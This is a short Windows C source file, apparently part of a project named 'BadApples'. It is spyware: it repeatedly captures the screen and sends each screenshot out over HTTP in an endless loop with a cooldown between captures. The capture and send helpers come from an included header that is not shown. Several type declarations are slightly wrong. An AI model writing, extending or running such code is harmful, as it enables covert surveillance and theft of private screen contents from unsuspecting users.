#include <windows.h>
#include <Shlwapi.h>
#include <stdio.h>
#include "../BadApples/common.h"

#pragma comment(lib, "Shlwapi.lib")

int main( void )
{
	PVOID pBuffer = NULL;
	ULONG uLong = NULL;
	LPCWSTR lpTempDir[ MAX_PATH ];

	if ( !GetTempPathW( MAX_PATH, lpTempDir ) )
	{
		return -1;
	}

	StrCatW( lpTempDir, L"Screenshot.bmp" );

	while ( TRUE )
	{
		if ( !ScreenshotBmp( &pBuffer, &uLong ) )
		{
			return -1;
		}

		if ( !SendOverHttp( pBuffer, uLong ) )
		{
			return -1;
		}

		RtlSecureZeroMemory( pBuffer, uLong );
		HeapFree( GetProcessHeap(), HEAP_ZERO_MEMORY, pBuffer );

		Sleep( SS_COOLDOWN );
	}

	return 0;
}
